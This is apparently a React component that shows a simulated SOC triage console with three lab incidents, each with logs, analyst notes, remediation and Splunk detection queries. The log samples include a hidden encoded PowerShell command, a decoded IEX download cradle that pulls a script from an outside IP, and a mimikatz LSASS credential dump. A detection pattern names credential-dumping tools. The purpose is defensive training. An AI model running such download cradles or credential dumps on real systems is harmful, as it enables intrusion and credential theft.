import React, { useState, useEffect } from 'react';

const ALERTS = [
  {
    id: 'ALT-2024-031',
    title: 'Impossible Travel — Okta Login Anomaly',
    severity: 'High',
    time: '09:52:17',
    source: '177.84.29.11 (São Paulo, BR)',
    target: 'jsmith@corp.com',
    category: 'Account Compromise',
    mitre: 'T1078.004',
    mitreName: 'Cloud Accounts',
    status: 'Escalated',
    logs: [
      '09:15:03 OKTA_AUTH user=jsmith ip=73.25.144.82 geo=Chicago,IL status=SUCCESS',
      '09:52:17 OKTA_AUTH user=jsmith ip=177.84.29.11 geo=Sao_Paulo,BR status=SUCCESS',
      '09:52:18 IMPOSSIBLE_TRAVEL dist=7842mi elapsed=37min speed=12699mph',
      '09:52:18 ALERT FIRED rule=IMPOSSIBLE_TRAVEL_001 severity=HIGH user=jsmith',
      '09:52:20 SESSION_ACTIVE jsmith@corp.com sessions=2 concurrent=true',
      '09:52:22 RESOURCE_ACCESS user=jsmith target=sharepoint-finance-srv action=READ',
    ],
    timeline: [
      { t: '09:15:03', e: 'Successful Okta login — jsmith from Chicago, IL (73.25.144.82)' },
      { t: '09:52:17', e: 'Second successful login — São Paulo, Brazil (177.84.29.11)' },
      { t: '09:52:18', e: 'Impossible travel rule fired — 7,842 miles in 37 minutes' },
      { t: '09:52:22', e: 'Suspicious resource access to finance SharePoint detected' },
      { t: '09:55:00', e: 'Analyst investigation initiated — both sessions active' },
    ],
    analystNotes: [
      '→ Chicago session confirmed legitimate — prior normal activity pattern',
      '→ São Paulo IP (177.84.29.11): ASN 18881 Oi S.A. — no prior association',
      '→ Physical travel impossible: 7,842mi / 37min = 12,699mph required',
      '→ Concurrent sessions accessing finance SharePoint — high-value target',
      '→ Assessment: credential compromise — VPN/proxy bypass likely used',
    ],
    remediation: ['Terminate São Paulo session immediately', 'Force MFA re-auth + password reset for jsmith', 'Audit all finance SharePoint access in last 2 hours', 'Check for forwarding rules added to jsmith mailbox', 'Escalate to Tier 2 — possible BEC (Business Email Compromise)'],
    splunkQuery: 'index=okta_logs action=authentication.session.start\n| iplocation client_ip\n| streamstats current=f last(City) as prev_city last(client_ip) as prev_ip last(_time) as prev_time by user\n| eval travel_hours=round((_time-prev_time)/3600,2)\n| eval flag=if(City!=prev_city AND travel_hours<4,"IMPOSSIBLE_TRAVEL","OK")\n| where flag="IMPOSSIBLE_TRAVEL"',
  },
  {
    id: 'ALT-2024-047',
    title: 'PowerShell Encoded C2 — Word Macro Drop',
    severity: 'Critical',
    time: '11:34:52',
    source: 'WKST-045 (10.0.2.31)',
    target: '185.220.101.47',
    category: 'Execution',
    mitre: 'T1059.001',
    mitreName: 'PowerShell',
    status: 'Investigating',
    logs: [
      '11:34:48 PROC_CREATE parent=winword.exe child=powershell.exe pid=4412 WKST-045',
      '11:34:52 CMDLINE powershell.exe -NoP -NonI -W Hidden -Enc JABzAGUAcgB2AGUAcgA=',
      '11:34:52 ALERT FIRED rule=OFFICE_CHILD_PS_ENCODED host=WKST-045 severity=CRITICAL',
      '11:34:53 DECODE base64 → IEX(New-Object Net.WebClient).DownloadString("http://185.220.101.47/update.ps1")',
      '11:34:55 HTTP_OUT src=WKST-045 dst=185.220.101.47:80 path=/update.ps1',
      '11:34:57 AV_DETECT WKST-045 process=powershell.exe sig=Trojan.Powershell.Downloader',
    ],
    timeline: [
      { t: '11:34:44', e: 'User opened invoice_2024.docm — macro-enabled document' },
      { t: '11:34:48', e: 'winword.exe spawned powershell.exe — suspicious parent-child chain' },
      { t: '11:34:52', e: 'Encoded PowerShell (-Enc flag) executed — evasion technique' },
      { t: '11:34:53', e: 'Base64 decoded: IEX download cradle to 185.220.101.47' },
      { t: '11:34:57', e: 'AV detection fired — host quarantine initiated' },
    ],
    analystNotes: [
      '→ Parent: winword.exe → child: powershell.exe — classic macro delivery chain',
      '→ -NoP -NonI -W Hidden -Enc flags: bypass profile, hide window, encoded payload',
      '→ Decoded command: IEX download cradle — stage 2 payload retrieval',
      '→ 185.220.101.47: Tor exit node — command infrastructure confirmed',
      '→ AV sig: Trojan.Powershell.Downloader — stage 2 likely RAT or implant',
    ],
    remediation: ['Quarantine WKST-045 immediately', 'Pull full PowerShell script block logging (Event 4104)', 'Block 185.220.101.47 at proxy and firewall', 'Check if update.ps1 downloaded successfully — memory analysis', 'Hunt all endpoints for winword → powershell process chains in last 24h'],
    splunkQuery: 'index=endpoint_logs source_process=winword.exe dest_process=powershell.exe\n| eval encoded=if(match(cmdline,"-[Ee][Nn][Cc]"),"YES","NO")\n| where encoded="YES"\n| rex field=cmdline "-[Ee][Nn][Cc]\\s+(?<b64>[A-Za-z0-9+/=]+)"\n| eval decoded=base64decode(b64)\n| table host, user, cmdline, decoded, _time',
  },
  {
    id: 'ALT-2024-059',
    title: 'LSASS Credential Dump — Domain Controller',
    severity: 'Critical',
    time: '02:11:33',
    source: 'SRV-DC01 (10.0.0.5)',
    target: 'lsass.exe (PID 728)',
    category: 'Credential Access',
    mitre: 'T1003.001',
    mitreName: 'LSASS Memory',
    status: 'Contained',
    logs: [
      '02:11:29 PROC_CREATE SRV-DC01 parent=cmd.exe child=mimikatz.exe pid=6108',
      '02:11:33 LSASS_ACCESS pid=6108 target=lsass.exe(728) access=PROCESS_VM_READ|PROCESS_VM_WRITE',
      '02:11:33 ALERT FIRED rule=LSASS_MEMORY_ACCESS host=SRV-DC01 severity=CRITICAL',
      '02:11:33 WIN_EVT 4656 ObjectName=\\Device\\HarddiskVolume2\\Windows\\System32\\lsass.exe',
      '02:11:35 NETWORK_OUT SRV-DC01 dst=10.0.4.88:4444 proto=TCP bytes=48230',
      '02:11:37 PROCESS_TERMINATED mimikatz.exe — host isolation triggered',
    ],
    timeline: [
      { t: '02:11:25', e: 'Attacker session active on SRV-DC01 via prior lateral movement' },
      { t: '02:11:29', e: 'mimikatz.exe spawned from cmd.exe on Domain Controller' },
      { t: '02:11:33', e: 'LSASS memory access detected — Event ID 10 (Sysmon) + Event 4656' },
      { t: '02:11:35', e: 'Outbound connection 10.0.4.88:4444 — credential exfil to C2' },
      { t: '02:11:37', e: 'Host isolated — all domain accounts flagged for rotation' },
    ],
    analystNotes: [
      '→ mimikatz.exe on DC: all Active Directory credentials at risk',
      '→ PROCESS_VM_READ on lsass.exe: NTLM hashes and Kerberos tickets extractable',
      '→ Outbound 10.0.4.88:4444: classic Metasploit/CS reverse shell port',
      '→ Event 4656 + Sysmon 10 correlation confirms credential dump completed',
      '→ CRITICAL: Domain-wide password reset required — all accounts compromised',
    ],
    remediation: ['Isolate SRV-DC01 from network immediately', 'Force domain-wide password reset — all AD accounts', 'Reset KRBTGT account twice (Kerberos Golden Ticket mitigation)', 'Pull memory dump from DC before reboot — forensic preservation', 'Investigate 10.0.4.88 — attacker pivot box — full network hunt required'],
    splunkQuery: 'index=sysmon_logs EventCode=10 TargetImage="*lsass.exe"\n| eval suspicious=if(match(SourceImage,"mimikatz|procdump|lsadump|gsecdump"),"CONFIRMED","REVIEW")\n| stats count by host, SourceImage, TargetImage, GrantedAccess, suspicious\n| where suspicious="CONFIRMED" OR GrantedAccess IN ("0x1010","0x1410","0x1038")\n| sort -count',
  },
];

const severityBadge = {
  Critical: 'bg-red-500/10 text-red-400 border-red-500/30',
  High: 'bg-amber-500/10 text-amber-400 border-amber-500/30',
  Medium: 'bg-blue-500/10 text-blue-400 border-blue-500/30',
  Low: 'bg-zinc-800 text-zinc-400 border-white/10',
};

const statusBadge = {
  Investigating: 'text-amber-400',
  Escalated: 'text-red-400',
  Contained: 'text-[#00E87A]',
};

export function IncidentCommandCenter() {
  const [selected, setSelected] = useState(ALERTS[0]);
  const [activeTab, setActiveTab] = useState('timeline');
  const [reportGenerated, setReportGenerated] = useState(false);
  const [tick, setTick] = useState(0);

  useEffect(() => {
    const i = setInterval(() => setTick(t => t + 1), 3000);
    return () => clearInterval(i);
  }, []);

  const generateReport = () => {
    const report = {
      incident_id: selected.id,
      severity: selected.severity,
      timestamp: new Date().toISOString(),
      mitre_technique: `${selected.mitre} — ${selected.mitreName}`,
      source: selected.source,
      target: selected.target,
      status: selected.status,
      analyst_findings: selected.analystNotes,
      remediation: selected.remediation,
      log_evidence: selected.logs.slice(0, 3),
    };
    const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `incident-report-${selected.id}.json`;
    a.click();
    setReportGenerated(true);
    setTimeout(() => setReportGenerated(false), 2500);
  };

  return (
    <div className="max-w-7xl mx-auto px-6 lg:px-12">
      {/* Header */}
      <div className="mb-10">
        <div className="inline-flex items-center gap-2 px-4 py-2 text-sm font-medium text-red-400 bg-red-500/10 border border-red-500/30 rounded-full mb-4">
          <span className="relative flex h-2 w-2">
            <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-red-400 opacity-75" />
            <span className="relative inline-flex rounded-full h-2 w-2 bg-red-400" />
          </span>
          Incident Command Center
        </div>
        <h2 className="text-4xl font-bold font-syne mb-3">
          SOC <span className="text-[#00E87A]">Investigation Console</span>
        </h2>
        <p className="text-zinc-400 max-w-2xl mb-3">
          Interactive investigation environment. Click any alert to load full incident context — logs, timeline, MITRE mapping, analyst notes, and SIEM query.
        </p>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 bg-amber-500/10 border border-amber-500/25 rounded-lg">
          <span className="text-amber-400 text-xs">⚠</span>
          <span className="font-mono text-xs text-amber-400/80">Simulated lab investigations — demonstrates real analyst triage methodology</span>
        </div>
      </div>

      <div className="grid lg:grid-cols-[280px_1fr_260px] gap-4">

        {/* LEFT — Alert Queue */}
        <div className="bg-zinc-900/50 border border-white/10 rounded-2xl overflow-hidden">
          <div className="px-4 py-3 border-b border-white/10 flex items-center justify-between">
            <span className="font-mono text-xs uppercase tracking-wider text-zinc-400">Alert Queue</span>
            <span className="font-mono text-xs text-[#00E87A]">{ALERTS.length} Active</span>
          </div>
          <div className="space-y-0">
            {ALERTS.map(alert => (
              <button
                key={alert.id}
                onClick={() => { setSelected(alert); setActiveTab('timeline'); }}
                className={`w-full text-left px-4 py-4 border-b border-white/5 transition-all hover:bg-zinc-800/50 ${
                  selected.id === alert.id ? 'bg-zinc-800/60 border-l-2 border-l-[#00E87A]' : ''
                }`}
              >
                <div className="flex items-center justify-between mb-1">
                  <span className="font-mono text-xs text-zinc-500">{alert.id}</span>
                  <span className="font-mono text-xs text-zinc-600">{alert.time}</span>
                </div>
                <div className="text-sm font-medium text-white leading-snug mb-2">{alert.title}</div>
                <div className="flex items-center gap-2">
                  <span className={`px-2 py-0.5 text-xs font-bold border rounded ${severityBadge[alert.severity]}`}>
                    {alert.severity}
                  </span>
                  <span className={`text-xs font-mono ${statusBadge[alert.status]}`}>
                    {alert.status}
                  </span>
                </div>
              </button>
            ))}
          </div>
          {/* Live events counter */}
          <div className="px-4 py-3 border-t border-white/10">
            <div className="font-mono text-xs text-zinc-600">
              Queue processed: <span className="text-[#00E87A]">{(41382 + tick * 7).toLocaleString()}</span>
            </div>
          </div>
        </div>

        {/* CENTER — Investigation Panel */}
        <div className="bg-zinc-900/50 border border-white/10 rounded-2xl overflow-hidden">
          {/* Alert header */}
          <div className="px-5 py-4 border-b border-white/10 bg-zinc-800/30">
            <div className="flex items-start justify-between gap-3 mb-2">
              <h3 className="text-base font-bold text-white font-syne">{selected.title}</h3>
              <span className={`px-2 py-0.5 text-xs font-bold border rounded flex-shrink-0 ${severityBadge[selected.severity]}`}>
                {selected.severity}
              </span>
            </div>
            <div className="flex flex-wrap gap-3 font-mono text-xs text-zinc-500">
              <span>ID: <span className="text-zinc-300">{selected.id}</span></span>
              <span>SRC: <span className="text-red-400">{selected.source}</span></span>
              <span>TIME: <span className="text-zinc-300">{selected.time}</span></span>
            </div>
          </div>

          {/* Tabs */}
          <div className="flex border-b border-white/10 bg-zinc-900/50">
            {[
              { key: 'timeline', label: 'Timeline' },
              { key: 'logs', label: 'Log Evidence' },
              { key: 'query', label: 'SIEM Query' },
            ].map(tab => (
              <button
                key={tab.key}
                onClick={() => setActiveTab(tab.key)}
                className={`px-4 py-2 font-mono text-xs uppercase tracking-wider transition-colors ${
                  activeTab === tab.key ? 'text-[#00E87A] border-b border-[#00E87A]' : 'text-zinc-500 hover:text-zinc-300'
                }`}
              >
                {tab.label}
              </button>
            ))}
          </div>

          {/* Tab content */}
          <div className="p-5 overflow-y-auto" style={{ maxHeight: '380px' }}>
            {activeTab === 'timeline' && (
              <div className="space-y-3">
                {selected.timeline.map((item, i) => (
                  <div key={i} className="flex gap-3 pl-2 border-l-2 border-[#00E87A]/30">
                    <span className="font-mono text-xs text-zinc-500 flex-shrink-0 w-16">{item.t}</span>
                    <span className="text-sm text-zinc-300 leading-snug">{item.e}</span>
                  </div>
                ))}
              </div>
            )}
            {activeTab === 'logs' && (
              <div className="font-mono text-xs space-y-1">
                {selected.logs.map((log, i) => (
                  <div key={i} className={`text-zinc-400 leading-relaxed ${
                    log.includes('ALERT') ? 'text-red-400 font-bold' :
                    log.includes('FAIL') ? 'text-amber-400' :
                    log.includes('DETECT') || log.includes('CAPTURE') ? 'text-amber-400' : ''
                  }`}>
                    &gt; {log}
                  </div>
                ))}
              </div>
            )}
            {activeTab === 'query' && (
              <div>
                <div className="font-mono text-xs text-zinc-500 uppercase tracking-wider mb-3">
                  Splunk SPL — {selected.category} Detection
                </div>
                <pre className="bg-black border border-[#00E87A]/20 rounded-lg p-4 font-mono text-xs text-[#00E87A] whitespace-pre-wrap leading-relaxed">
                  {selected.splunkQuery}
                </pre>
                <div className="mt-3 p-3 bg-zinc-800/50 rounded-lg">
                  <div className="font-mono text-xs text-zinc-500 mb-1">Detection Purpose — {selected.category}</div>
                  <div className="text-xs text-zinc-400">
                    MITRE <span className="text-amber-400">{selected.mitre} — {selected.mitreName}</span>. Query targets {selected.category.toLowerCase()} activity from source <span className="text-red-400 font-mono">{selected.source}</span>. Results feed directly into escalation workflow.
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* RIGHT — MITRE + Notes + Remediation */}
        <div className="space-y-4">
          {/* MITRE */}
          <div className="bg-zinc-900/50 border border-white/10 rounded-2xl p-4">
            <div className="font-mono text-xs uppercase tracking-wider text-zinc-500 mb-3">MITRE ATT&CK</div>
            <div className="text-2xl font-bold text-amber-400 font-syne mb-1">{selected.mitre}</div>
            <div className="text-sm text-white mb-2">{selected.mitreName}</div>
            <div className="font-mono text-xs text-zinc-500">{selected.category}</div>
          </div>

          {/* Analyst Notes */}
          <div className="bg-zinc-900/50 border border-white/10 rounded-2xl p-4">
            <div className="font-mono text-xs uppercase tracking-wider text-zinc-500 mb-3">Analyst Notes</div>
            <div className="space-y-2">
              {selected.analystNotes.map((note, i) => (
                <div key={i} className="font-mono text-xs text-zinc-400 leading-relaxed">
                  {note}
                </div>
              ))}
            </div>
          </div>

          {/* Remediation */}
          <div className="bg-zinc-900/50 border border-white/10 rounded-2xl p-4">
            <div className="font-mono text-xs uppercase tracking-wider text-zinc-500 mb-3">Remediation</div>
            <div className="space-y-1.5">
              {selected.remediation.map((step, i) => (
                <div key={i} className="flex gap-2">
                  <span className="text-[#00E87A] text-xs flex-shrink-0">{i + 1}.</span>
                  <span className="text-xs text-zinc-400 leading-snug">{step}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Export */}
          <button
            onClick={generateReport}
            className="w-full px-4 py-3 font-mono text-xs uppercase tracking-wider text-black bg-[#00E87A] rounded-xl hover:bg-[#00E87A]/90 transition-colors"
          >
            {reportGenerated ? '✓ Report Downloaded' : 'Export Incident Report →'}
          </button>
        </div>
      </div>
    </div>
  );
}
